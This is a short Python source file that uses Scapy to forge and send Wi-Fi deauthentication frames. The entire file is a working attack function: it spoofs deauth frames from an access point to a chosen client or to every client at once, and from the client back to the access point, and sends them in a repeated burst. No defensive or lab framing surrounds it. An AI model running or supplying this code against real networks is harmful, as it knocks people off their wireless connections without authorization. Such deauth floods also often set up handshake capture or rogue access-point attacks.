from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def perform_deauth(interface, target_mac, bssid=None, count=100, callback=None):
    ap_mac = bssid or target_mac
    client_mac = target_mac if bssid else 'ff:ff:ff:ff:ff:ff'

    packets = []
    # send deauth from AP to client or all clients
    packets.append(RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth())
    # send deauth from client to AP
    if bssid:
        packets.append(RadioTap() / Dot11(addr1=ap_mac, addr2=client_mac, addr3=ap_mac) / Dot11Deauth())

    sendp(packets, iface=interface, count=count, inter=0.05, verbose=0)

    if callback:
        callback()